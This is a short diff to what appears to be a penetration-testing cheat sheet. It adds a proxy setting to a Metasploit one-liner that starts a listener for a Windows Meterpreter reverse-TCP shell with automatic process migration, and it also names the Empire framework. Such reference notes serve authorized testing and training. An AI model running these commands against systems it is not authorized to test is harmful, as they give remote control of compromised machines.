@@ -314,6 +314,7 @@ ___
 - Metasploit:
     - `msfconsole -r script.rc`
     - `msfconsole -qx "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set AutoRunScript post/windows/manage/migrate; run"`
+    	+ `set Proxies socks5:127.0.0.1:1080; set ReverseAllowProxy true` 
 - [Empire](https://github.com/BC-SECURITY/Empire)
 - Simple Port Scan in Bash:
     
